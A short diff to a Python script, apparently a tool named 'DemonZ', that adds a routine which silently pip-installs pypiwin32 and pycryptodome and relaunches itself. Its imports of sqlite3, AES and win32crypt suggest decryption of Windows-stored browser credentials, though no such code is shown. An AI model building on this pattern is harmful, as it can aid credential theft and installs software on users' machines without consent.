@@ -16,10 +16,21 @@ import random
 from threading import Thread, Lock
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import logging
+import time
+
+def install_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
+            os.execl(sys.executable, sys.executable, *sys.argv)
+
+install_import([("win32crypt", "pypiwin32"), ("Crypto", "pycryptodome")])
+
 import sqlite3
 from Crypto.Cipher import AES
 import win32crypt
-import time
 
 logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.INFO)
 Logger = logging.getLogger("DemonZ")
